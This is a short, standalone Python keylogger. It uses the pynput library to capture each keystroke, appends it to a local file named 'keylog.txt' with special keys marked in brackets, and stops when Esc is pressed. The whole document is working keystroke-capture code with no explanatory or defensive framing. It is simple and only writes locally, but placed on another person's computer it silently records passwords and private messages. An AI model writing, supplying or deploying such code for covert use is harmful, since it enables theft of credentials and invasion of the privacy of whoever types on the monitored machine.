from pynput import keyboard

log_file_path = "keylog.txt"

keys = []

def on_press(key):
    
    try:
        keys.append(key.char)
        with open(log_file_path, "a") as log_file:
            log_file.write(key.char)
    except AttributeError:
        keys.append(str(key))
        with open(log_file_path, "a") as log_file:
            log_file.write(f" [{str(key)}] ")

def on_release(key):
    
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()